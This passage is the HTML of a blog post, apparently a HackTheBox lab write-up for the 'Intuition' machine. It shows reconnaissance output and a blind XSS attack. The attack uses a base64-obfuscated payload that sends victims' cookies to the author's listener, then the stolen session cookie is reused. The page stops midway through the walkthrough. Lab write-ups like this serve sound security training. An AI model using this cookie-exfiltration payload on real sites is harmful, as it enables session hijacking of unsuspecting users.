@@ -1,0 +1,954 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://foued-saidi.tech/2024/09/13/hackthebox-intuition/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewIntuition is a linux hard-difficulty HackTheBox machine dealing initially with an XSS vulnerability that allows us to access an admin dashboard, later abusing CVE-2023–24329 to be able to leve">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Intuition">
+<meta property="og:url" content="http://foued-saidi.tech/2024/09/13/Hackthebox-Intuition/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewIntuition is a linux hard-difficulty HackTheBox machine dealing initially with an XSS vulnerability that allows us to access an admin dashboard, later abusing CVE-2023–24329 to be able to leve">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Intuition/Intuition.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Intuition/auth-login.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Intuition/auth-registered-user.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Intuition/auth-report.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Intuition/dashboard.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Intuition/dashboard1.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Intuition/dashboard2.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Intuition/dashboard4.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Intuition/create-pdf.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Intuition/create-report2.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Intuition/CVE-2023%E2%80%9324329.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Intuition/CVE-2023%E2%80%9324329-2.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Intuition/cve3.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Intuition/cve4.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Intuition/cve5.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Intuition/cve6.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Intuition/cve7.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Intuition/cve8.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Intuition/cve9.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Intuition/cve10.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Intuition/cve11.png">
+<meta property="article:published_time" content="2024-09-13T13:48:23.000Z">
+<meta property="article:modified_time" content="2024-09-14T16:35:41.950Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Intuition/Intuition.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Intuition -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"foued-saidi.tech","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":["SecuriNets for life <3."],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Intuition</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-09-13 14:48:23</span>
+        <span class="mobile">2024-09-13 14:48:23</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-09-14 17:35:41</span>
+            <span class="mobile">2024-09-14 17:35:41</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>Intuition is a linux hard-difficulty HackTheBox machine dealing initially with an XSS vulnerability that allows us to access an admin dashboard, later abusing CVE-2023–24329 to be able to leverage a file read vulnerability in Python-urllib&#x2F;3.11 and get system access and user flag. As for root, it deals with abusing an internal binary interacting with ansible through command injection.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Intuition/Intuition.png"
+                      alt="Intuition-info-card"
+                ><figcaption>Intuition-info-card</figcaption></figure></p>
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.129</span>.<span class="number">158.234</span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2024</span><span class="literal">-09-13</span> <span class="number">16</span>:<span class="number">24</span> W. Central Africa Standard Time</span><br><span class="line">NSOCK ERROR <span class="function">[<span class="number">0.2860</span><span class="type">s</span>] <span class="title">ssl_init_helper</span></span>(): OpenSSL legacy provider failed to load.</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">158.234</span></span><br><span class="line">Host is up (<span class="number">0.21</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">8.9</span>p1 Ubuntu <span class="number">3</span>ubuntu0.<span class="number">7</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>:</span><br><span class="line">|   <span class="number">256</span> b3a8f75d60e86616ca92f676bab833c2 (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">07</span>ef11a6a07d2b4de868791a7ba7a9<span class="built_in">cd</span> (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    nginx <span class="number">1.18</span>.<span class="number">0</span> (Ubuntu)</span><br><span class="line">|_http<span class="literal">-title</span>: Did not follow redirect to http://comprezzor.htb/</span><br><span class="line">|_http<span class="literal">-server-header</span>: nginx/<span class="number">1.18</span>.<span class="number">0</span> (Ubuntu)</span><br><span class="line">Aggressive OS guesses: Linux <span class="number">4.15</span> - <span class="number">5.6</span> (<span class="number">95</span>%), Linux <span class="number">5.3</span> - <span class="number">5.4</span> (<span class="number">95</span>%), Linux <span class="number">2.6</span>.<span class="number">32</span> (<span class="number">95</span>%), Linux <span class="number">5.0</span> - <span class="number">5.3</span> (<span class="number">95</span>%), Linux <span class="number">3.1</span> (<span class="number">95</span>%), Linux <span class="number">3.2</span> (<span class="number">95</span>%), AXIS <span class="number">210</span>A or <span class="number">211</span> Network Camera (Linux <span class="number">2.6</span>.<span class="number">17</span>) (<span class="number">94</span>%), ASUS RT<span class="literal">-N56U</span> WAP (Linux <span class="number">3.4</span>) (<span class="number">93</span>%), Linux <span class="number">3.16</span> (<span class="number">93</span>%), Linux <span class="number">5.0</span> - <span class="number">5.4</span> (<span class="number">93</span>%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (test conditions non<span class="literal">-ideal</span>).</span><br><span class="line">Network Distance: <span class="number">2</span> hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (<span class="keyword">using</span> port 993/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">102.00</span> ms <span class="number">10.10</span>.<span class="number">16.1</span></span><br><span class="line"><span class="number">2</span>   <span class="number">204.00</span> ms <span class="number">10.129</span>.<span class="number">158.234</span></span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">61.08</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have a couple of open ports: 22 for ssh and 80 for http. We can also see that we have a <code>comprezzor.htb</code> domain, so we go ahead and add that entry to our <code>/etc/hosts</code> file.</p>
+<h4 id="Subdomain-Enumeration"><a href="#Subdomain-Enumeration" class="headerlink" title="Subdomain Enumeration"></a>Subdomain Enumeration</h4><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; .\ffuf.exe <span class="literal">-w</span> ..\SecLists\Discovery\DNS\bitquark<span class="literal">-subdomains-top100000</span>.txt <span class="literal">-H</span> <span class="string">&quot;Host: FUZZ.comprezzor.htb&quot;</span> <span class="literal">-u</span> <span class="string">&quot;http://10.129.158.234&quot;</span>  <span class="literal">-fs</span> <span class="number">178</span></span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://10.129.158.234</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: C:\Users\0xkujen\Tools\SecLists\Discovery\DNS\bitquark-subdomains-top100000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.comprezzor.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response size: 178</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">auth                    [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 626ms] 0 ::</span></span><br><span class="line"><span class="string">dashboard               [Status: 302, Size: 251, Words: 18, Lines: 6, Duration: 330ms] 0 ::</span></span><br><span class="line"><span class="string">report                  [Status: 200, Size: 3166, Words: 1102, Lines: 109, Duration: 148ms]::</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have 3 different subdomains, once more we add those to our <code>/etc/hosts</code> file.</p>
+<h3 id="Web-Application-http-auth-comprezzor-htb"><a href="#Web-Application-http-auth-comprezzor-htb" class="headerlink" title="Web Application - http://auth.comprezzor.htb"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://auth.comprezzor.htb/" >http://auth.comprezzor.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p>We are greeted with a simple login page:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Intuition/auth-login.png"
+                      alt="Login"
+                ><figcaption>Login</figcaption></figure></p>
+<p>We go ahead and create an account to login with:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Intuition/auth-registered-user.png"
+                      alt="Auth panel"
+                ><figcaption>Auth panel</figcaption></figure></p>
+<p>We navigate to <code>http://report.comprezzor.htb/report_bug</code> and we can see that we can submit a report:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Intuition/auth-report.png"
+                      alt="Report submission"
+                ><figcaption>Report submission</figcaption></figure></p>
+<h4 id="Blind-XSS"><a href="#Blind-XSS" class="headerlink" title="Blind XSS"></a>Blind XSS</h4><p>The form is vulnerable to Blind XSS, therefore we could hijack the user cookies:</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&#x27;eval(atob(&quot;ZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNi4yOS8/Y29va2llPScrZG9jdW1lbnQuY29va2llKQ==&quot;));&#x27;</span> /&gt;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\0xkujen&gt; python3 -m http.server 80</span><br><span class="line">Serving HTTP on :: port 80 (http://[::]:80/) ...</span><br><span class="line">::ffff:10.129.158.234 - - [13/Sep/2024 17:00:47] <span class="string">&quot;GET /?cookie=user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1&quot;</span> 200 -</span><br><span class="line">::ffff:10.129.158.234 - - [13/Sep/2024 17:00:47] <span class="string">&quot;GET /?cookie=user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1&quot;</span> 200 -</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>Decoding the cookie it gives us these values:</p>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;user_id&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span> <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;adam&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webdev&quot;</span><span class="punctuation">&#125;</span>|<span class="number">58</span>f6f725339ce3f69d8552a10696ddebb68b2b57d2e523c08bde868d3a756db8</span><br></pre></td></tr></table></figure></div>
+
+<p>Maybe We can now abuse this cookie to access another subdomain?</p>
+<h3 id="Web-Application-http-dashboard-comprezzor-htb"><a href="#Web-Application-http-dashboard-comprezzor-htb" class="headerlink" title="Web Application - http://dashboard.comprezzor.htb"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://dashboard.comprezzor.htb/" >http://dashboard.comprezzor.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Intuition/dashboard.png"
+                      alt="Dashboard"
+                ><figcaption>Dashboard</figcaption></figure></p>
+<p>We now set the cookie we just hijacked and try to access to dashboard:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Intuition/dashboard1.png"
+                      alt="Cookie manipulation"
+                ><figcaption>Cookie manipulation</figcaption></figure></p>
+<p>We can then see that our user <code>adam</code> has the right to change some reports’ priorities:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Intuition/dashboard2.png"
+                      alt="Report manipulation"
+                ><figcaption>Report manipulation</figcaption></figure></p>
+<p>So here’s the thought process: We submit a report by adam &#x3D;&gt; change the report level to High &#x3D;&gt; admin checks our report &#x3D;&gt; we get the admin cookie. And that is exactly what happened, we got out cookie:</p>
